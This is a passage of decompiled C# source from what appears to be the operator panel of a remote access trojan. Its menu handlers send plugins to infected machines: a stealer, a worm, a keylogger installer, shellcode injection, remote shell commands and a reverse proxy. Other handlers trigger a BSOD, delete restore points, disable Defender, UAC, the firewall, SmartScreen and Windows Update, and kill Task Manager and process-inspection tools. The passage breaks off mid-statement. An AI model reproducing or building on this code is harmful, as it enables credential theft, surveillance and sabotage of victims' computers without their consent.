		formInput.rjTextBox1.PlaceholderText = "https://example.com/";
		formInput.ShowDialog();
		if (!formInput.Run)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[2]
		{
			"OpenLinkInv",
			formInput.rjTextBox1.Texts
		});
		string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void botSpeakerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\BotSpeaker.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormSpeakerBot)Application.OpenForms["BotSpeaker:" + clients.Hwid] == null)
			{
				FormSpeakerBot formSpeakerBot = new FormSpeakerBot();
				formSpeakerBot.Name = "BotSpeaker:" + clients.Hwid;
				formSpeakerBot.parrent = clients;
				formSpeakerBot.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void shellCodeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() != DialogResult.OK)
		{
			return;
		}
		byte[] pack = LEB128.Write(new object[2]
		{
			"ShellCode",
			File.ReadAllBytes(openFileDialog.FileName)
		});
		string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem32_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "SmartScreen+" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem33_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "SmartScreen-" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void hostFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\HostsFile.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormHostsFile)Application.OpenForms["HostsFile:" + clients.Hwid] == null)
			{
				FormHostsFile formHostsFile = new FormHostsFile();
				formHostsFile.Name = "HostsFile:" + clients.Hwid;
				formHostsFile.parrent = clients;
				formHostsFile.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void notepadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Notepad.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormNotepad)Application.OpenForms["Notepad:" + clients.Hwid] == null)
			{
				FormNotepad formNotepad = new FormNotepad();
				formNotepad.Name = "Notepad:" + clients.Hwid;
				formNotepad.parrent = clients;
				formNotepad.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void keyLoggerUninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\KeyLoggerRemover.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void fastRunToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		FormInput formInput = new FormInput();
		formInput.Text = "Command Shell";
		formInput.rjTextBox1.PlaceholderText = "Command";
		formInput.ShowDialog();
		if (!formInput.Run)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Shell.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					LEB128.Write(new object[2]
					{
						"ShellRun",
						formInput.rjTextBox1.Texts
					})
				});
			});
		}
	}

	private void stealthSaverToolStripMenuItem_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\StealthSaver.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void toolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (!ReverseProxyU.Visible && ReverseProxyU.work)
		{
			ReverseProxyU.Show();
		}
		if (ReverseProxyU.work)
		{
			return;
		}
		ReverseProxyU.Show();
		ReverseProxyU.work = true;
		string checksum = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
		byte[] pack = LEB128.Write(new object[2] { "Pack", "ReverseProxyU" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void volumeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Volume.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormVolumeControl)Application.OpenForms["Volume:" + clients.Hwid] == null)
			{
				FormVolumeControl formVolumeControl = new FormVolumeControl();
				formVolumeControl.Name = "Volume:" + clients.Hwid;
				formVolumeControl.parrent = clients;
				formVolumeControl.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void deviceManagerToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\DeviceManager.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormDeviceManager)Application.OpenForms["DeviceManager:" + clients.Hwid] == null)
			{
				FormDeviceManager formDeviceManager = new FormDeviceManager();
				formDeviceManager.Name = "DeviceManager:" + clients.Hwid;
				formDeviceManager.parrent = clients;
				formDeviceManager.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] pack = LEB128.Write(new object[1] { "ResetScale" });
		Clients[] array = ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3] { "Invoke", checksum, pack });
			});
		}
	}

	private void toolStripMenuItem80_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Stealer1.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					checksum,
					new byte[1]
				});
			});
		}
	}

	private void toolStripMenuItem75_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			byte[] array = LEB128.Write(new object[3]
			{
				"SendDisk",
				Path.GetExtension(openFileDialog.FileName),
				File.ReadAllBytes(openFileDialog.FileName)
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_SendDisk";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem76_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			byte[] array = LEB128.Write(new object[3]
			{
				"SendMemory",
				File.ReadAllBytes(openFileDialog.FileName),
				Path.GetFileName(openFileDialog.FileName)
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_SendMemory";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem77_Click(object sender, EventArgs e)
	{
		FormInput formInput = new FormInput();
		formInput.Text = "Url";
		formInput.rjTextBox1.PlaceholderText = "https://example.com/ups.exe";
		formInput.ShowDialog();
		if (formInput.Run)
		{
			byte[] array = LEB128.Write(new object[2]
			{
				"SendLink",
				formInput.rjTextBox1.Texts
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_SendLink";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem78_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			byte[] array = LEB128.Write(new object[2]
			{
				"ShellCode",
				File.ReadAllBytes(openFileDialog.FileName)
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_ShellCode";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void removeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		foreach (DataGridViewRow selectedRow in dataGridView2.SelectedRows)
		{
			dataGridView2.Rows.Remove(selectedRow);
		}
	}

	private void renameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		foreach (DataGridViewRow selectedRow in dataGridView2.SelectedRows)
		{
			Server.Helper.Tasks.Task task = (Server.Helper.Tasks.Task)selectedRow.Tag;
			FormInput formInput = new FormInput();
			formInput.Text = "Rename task: " + task.Name;
			formInput.rjTextBox1.PlaceholderText = task.Name;
			formInput.ShowDialog();
			if (formInput.Run)
			{
				task.Name = formInput.rjTextBox1.Texts;
				selectedRow.Cells[2].Value = task.Name;
			}
		}
	}

	private void runOnceRunAllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		foreach (DataGridViewRow selectedRow in dataGridView2.SelectedRows)
		{
			Server.Helper.Tasks.Task task = (Server.Helper.Tasks.Task)selectedRow.Tag;
			task.RunOnce = !task.RunOnce;
			selectedRow.Cells[0].Value = task.RunOnce;
		}
	}

	private void toolStripMenuItem82_Click(object sender, EventArgs e)
	{
		FormInput formInput = new FormInput();
		formInput.Text = "Url";
		formInput.rjTextBox1.PlaceholderText = "https://example.com/";
		formInput.ShowDialog();
		if (formInput.Run)
		{
			byte[] array = LEB128.Write(new object[2]
			{
				"OpenLink",
				formInput.rjTextBox1.Texts
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_Open_Link_Visible";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem83_Click(object sender, EventArgs e)
	{
		FormInput formInput = new FormInput();
		formInput.Text = "Url";
		formInput.rjTextBox1.PlaceholderText = "https://example.com/";
		formInput.ShowDialog();
		if (formInput.Run)
		{
			byte[] array = LEB128.Write(new object[2]
			{
				"OpenLinkInv",
				formInput.rjTextBox1.Texts
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii();
			AutoTaskMgr.AppendTask(task);
			task.Name = Randomizer.getRandomCharactersAscii() + "_Open_Link_Invisible";
		}
	}

	private void toolStripMenuItem79_Click(object sender, EventArgs e)
	{
		FormInput formInput = new FormInput();
		formInput.Text = "Command Shell";
		formInput.rjTextBox1.PlaceholderText = "Command";
		formInput.ShowDialog();
		if (formInput.Run)
		{
			string checksum = Methods.GetChecksum("Plugin\\Shell.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3]
			{
				"Invoke",
				checksum,
				LEB128.Write(new object[2]
				{
					"ShellRun",
					formInput.rjTextBox1.Texts
				})
			};
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_ShellRun";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem36_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Worm.dll");
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3]
		{
			"Invoke",
			checksum,
			new byte[1]
		};
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Worm";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem37_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\StealthSaver.dll");
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3]
		{
			"Invoke",
			checksum,
			new byte[1]
		};
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Stealth_Saver";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem38_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\BotKiller.dll");
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3]
		{
			"Invoke",
			checksum,
			new byte[1]
		};
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Botkiller";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem40_Click(object sender, EventArgs e)
	{
		if (File.Exists("Stub\\KeyLogger.exe"))
		{
			byte[] array = LEB128.Write(new object[3]
			{
				"SendDisk",
				".exe",
				File.ReadAllBytes("Stub\\KeyLogger.exe")
			});
			string checksum = Methods.GetChecksum("Plugin\\SendFile.dll");
			Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
			task.task = new object[3] { "Invoke", checksum, array };
			task.Runs = 0L;
			task.TasksRunsed = new List<string>();
			task.RunOnce = true;
			task.Name = Randomizer.getRandomCharactersAscii() + "_KeyLogger_Install";
			AutoTaskMgr.AppendTask(task);
		}
	}

	private void toolStripMenuItem42_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\KeyLoggerRemover.dll");
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3]
		{
			"Invoke",
			checksum,
			new byte[1]
		};
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_KeyLogger_Uninstall";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem43_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Net3" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Net3";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem44_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "BSOD" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_BSOD";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem45_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "DeletePoints" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_DeletePoints";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem46_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "ResetScale" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_ResetScale";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem48_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Regedit+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Regedit_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem49_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Regedit-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Regedit_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem51_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "TaskMgr+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_TaskMgr_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem52_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "TaskMgr-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_TaskMgr_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem54_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Cmd+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Shell_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem55_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Cmd-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Shell_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem57_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "WinR+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_WinR_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem58_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "WinR-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_WinR_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem60_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Defender+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Defender_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem61_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Defender-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Defender_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem63_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Uac+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem64_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Uac-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Uac_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem66_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "FireWall+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_FireWall_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem67_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "FireWall-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_FireWall_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem69_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "SmartScreen+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_SmartScreen_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem70_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "SmartScreen-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_SmartScreen_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem72_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Updates+" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Windows_Update_Enable";
		AutoTaskMgr.AppendTask(task);
	}

	private void toolStripMenuItem73_Click(object sender, EventArgs e)
	{
		string checksum = Methods.GetChecksum("Plugin\\Action.dll");
		byte[] array = LEB128.Write(new object[1] { "Updates-" });
		Server.Helper.Tasks.Task task = new Server.Helper.Tasks.Task();
		task.task = new object[3] { "Invoke", checksum, array };
		task.Runs = 0L;
		task.TasksRunsed = new List<string>();
		task.RunOnce = true;
		task.Name = Randomizer.getRandomCharactersAscii() + "_Windows_Update_Disable";
		AutoTaskMgr.AppendTask(task);
	}

	private void noteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Note";
			formInput.rjTextBox1.PlaceholderText = "Note...";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				File.WriteAllText("Users\\" + clients.Hwid + "\\Note.txt", formInput.rjTextBox1.Texts);
				((DataGridViewRow)clients.Tag).Cells[4].Value = formInput.rjTextBox1.Texts;
			}
		}
	}

	private void performanceToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		string checksum = Methods.GetChecksum("Plugin\\Performance.dll");
		Clients[] array = ClientsSelected();
		foreach (Clients clients in array)
		{
			if ((FormPerformance)Application.OpenForms["Performance:" + clients.Hwid] == null)
			{
				FormPerformance formPerformance = new FormPerformance();
				formPerformance.Name = "Performance:" + clients.Hwid;
				formPerformance.parrent = clients;
				formPerformance.Show();
				System.Threading.Tasks.Task.Run(delegate
				{
					clients.Send(new object[3]
					{
						"Invoke",
						checksum,
						new byte[1]
					});
				});
			}
		}
	}

	private void killToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (GridClients.SelectedRows.Count == 0)
		{
			return;
		}
		FormInput formInput = new FormInput();
		formInput.Text = "Kill processes";
		formInput.rjTextBox1.PlaceholderText = "Process.exe,Process1.exe";
		formInput.rjTextBox1.Texts = "Taskmgr.exe,ProcessHacker.exe,procexp.exe";
		formInput.ShowDialog();
		if (!formInput.Run)
		{
			return;
		}
		List<object> list = new List<object>();
		string[] array = formInput.rjTextBox1.Texts.Split(',');
		foreach (string item in array)
		{
			list.Add(item);
		}
		byte[] pack = LEB128.Write(new object[2]
		{
			true,
